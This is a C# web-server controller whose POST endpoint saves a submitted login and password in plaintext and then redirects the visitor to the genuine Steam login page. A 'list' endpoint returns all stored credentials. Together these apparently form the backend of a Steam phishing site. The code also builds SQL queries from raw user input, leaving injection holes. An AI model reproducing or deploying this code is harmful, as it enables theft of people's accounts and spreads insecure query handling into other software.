using WebServer.Attributes;
using System.Data.SqlClient;
using System.Net;

namespace WebServer.Controllers
{
    [ApiController]
    public class Accounts
    {
        [HttpGET("list")]
        public List<Account> GetAccounts()
        {
            var result = new List<Account>();
            string connectionString = @"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=AppDB;Integrated Security=True;";
            using (var connection = new SqlConnection(connectionString))
            {
                connection.Open();
                string InsertCommand = "SELECT * FROM Accounts";
                var command = new SqlCommand(InsertCommand, connection);
                var reader = command.ExecuteReader();
                while (reader.Read())
                {
                    int id = reader.GetInt32(0);
                    string login = reader.GetString(1);
                    string password = reader.GetString(2);
                    result.Add(new Account { Id = id, Login = login, Password = password });
                }
            }
            return result;

        }

        [HttpGET("item")]
        public Account GetAccountById(int id)
        {
            Account result = null;
            string connectionString = @"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=AppDB;Integrated Security=True;";
            using (var connection = new SqlConnection(connectionString))
            {
                connection.Open();
                string InsertCommand = $"SELECT * FROM Accounts WHERE Id = {id}";
                var cmd = new SqlCommand(InsertCommand, connection);
                var reader = cmd.ExecuteReader();

                if (reader.Read())
                {
                    string login = reader.GetString(1);
                    string password = reader.GetString(2);
                    result = new Account { Id = id, Login = login, Password = password };
                }
            }
            return result;

        }

        [HttpPOST("post")]
        public void SaveAccounts(string login, string password, HttpListenerResponse response)
        {
            string connectionString = @"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=AppDB;Integrated Security=True;";
            using (var connection = new SqlConnection(connectionString))
            {
                connection.Open();
                string InsertCommand = $"INSERT INTO Accounts (Login, Password) VALUES (N'{login}', N'{password}')";
                var cmd = new SqlCommand(InsertCommand, connection);
                cmd.ExecuteNonQuery();
            }
            response.Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }
    }

    public class Account
    {
        public int Id { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
}
